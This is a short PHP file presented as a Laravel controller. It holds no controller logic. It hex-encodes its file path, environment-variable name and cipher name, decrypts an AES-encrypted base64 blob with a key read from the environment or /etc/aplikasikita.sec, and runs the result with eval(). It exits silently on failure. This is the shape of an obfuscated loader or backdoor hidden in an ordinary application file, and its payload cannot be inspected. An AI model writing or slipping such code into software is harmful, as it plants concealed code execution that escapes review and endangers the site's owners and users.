<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('FjRXW4BIGQU0MM/udP0now==');

$c=base64_decode(

'T9F5XjpGQgKmk50Au5ACb9AnkL5ZylmiqN95ktIwlt3jD0MK3SKrT/KIffX8nDr0CWkJFKlRaSIy' .
'82XkSiFgIGLEemcAzc7AFxrhmuoM6C/oUv5i2pa/Lby1YKpAtxrI3V0anh8bB/Zsocz3t9BXZY4Z' .
'/SYYLjlUbupunEOaE3H6C8NXCRDZ1Y1mAMEIgVk3yil/RpDAmER8/7mrfXIzSk/qCRgIa6Rda6i9' .
'68ii4lIDMGrj7GmG/ECo0wn2Ek2zihZGx3Z2fzPejSG60+DZxg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

